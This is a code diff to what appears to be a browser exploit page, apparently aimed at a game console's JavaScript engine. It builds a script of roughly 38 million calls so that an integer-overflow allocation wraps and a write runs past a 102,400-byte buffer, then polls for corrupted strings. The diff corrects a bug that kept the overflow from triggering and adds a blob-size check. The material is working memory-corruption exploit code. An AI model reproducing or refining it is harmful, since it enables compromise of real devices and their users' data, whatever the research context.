@@ -109,7 +109,9 @@
             }
           }
           iter++;
-          if (iter % 500000 === 0) beacon('POLL-' + iter);
+          // Every 5M iterations: the Chromium harness produced ~66 beacons/s at
+          // 500k, which competes with the compile itself over console Wi-Fi.
+          if (iter % 5000000 === 0) beacon('POLL-' + iter);
         }
 
         // Every string, not just the first hit: p146 saw all 14 corrupted.
@@ -195,37 +197,39 @@
     // Same wrap as p142/p146: 38348816 * 112 = 2^32 + 100096, so the
     // allocated table is one 102,400-byte slot and the write runs far past it.
     var N_OVERFLOW = CALLS;
-    var CHUNK = 4000000;
+    var CHUNK_UNITS = 4000000;
     var units = MODE === 'pair' ? [ 'a();', 'b();' ] : [ 'a();' ];
-    var perChunkCalls = Math.floor(CHUNK / units.length);
-    // Each chunk must carry perChunkCalls repetitions of the unit text. The
-    // committed version pushed units.join('') once per chunk (8 bytes), so the
-    // generated function held ~2.35M op_calls and the metadata table never
-    // wrapped — caught on device (third console): BLOB-9MB instead of ~146MB,
-    // SURVIVED, and the worker polled forever with zero corruption.
+
+    // One chunk really has to contain CHUNK_UNITS calls; the Blob reuses this
+    // single string, so only one copy is held in memory.
     var chunkText = '';
-    for (var u = 0; u < perChunkCalls; u++) chunkText += units.join('');
+    for (var c = 0; c < CHUNK_UNITS; c++) chunkText += units[c % units.length];
+
+    var fullChunks = Math.floor(N_OVERFLOW / CHUNK_UNITS);
+    var rest = N_OVERFLOW - fullChunks * CHUNK_UNITS;
 
     var parts = ['window.__v161fn=function(a,b){'];
-    var chunks = Math.floor(N_OVERFLOW / (perChunkCalls * units.length) );
-
-    // restore with the exact remaining call count
-    var callsDone = 0;
-    var pieces = [];
-    for (var c = 0; c < chunks; c++) {
-      pieces.push(chunkText);
-      callsDone += perChunkCalls * units.length;
-    }
-    var rest = N_OVERFLOW - callsDone;
-    for (var r = 0; r < rest; r++) pieces.push(units[r % units.length]);
-    pieces.push('};window.__v161ok=true;');
-    parts = parts.concat(pieces);
+    for (var k = 0; k < fullChunks; k++) parts.push(chunkText);
+    var tail = '';
+    for (var r = 0; r < rest; r++) tail += units[r % units.length];
+    parts.push(tail);
+    parts.push('};window.__v161ok=true;');
 
     var blob = new Blob(parts, { type: 'application/javascript' });
     var mb = blob.size / 1048576;
     B('BLOB-' + (mb >= 1 ? mb.toFixed(0) + 'MB' : (blob.size / 1024).toFixed(0) + 'KB') + '-calls=' + N_OVERFLOW);
-    pieces = null;
     parts = null;
+    chunkText = null;
+    tail = null;
+
+    // Every call is 4 characters; the function wrapper is 53 bytes. A shorter
+    // blob means the sweep count is wrong and the wrap cannot happen, so say so
+    // instead of running a probe that cannot observe anything.
+    var expectedSize = N_OVERFLOW * 4 + 53;
+    if (blob.size !== expectedSize) {
+      B('BLOB-MISMATCH-' + blob.size + '-expected-' + expectedSize);
+      return;
+    }
 
     var sc = document.createElement('script');
     sc.onload = function() {
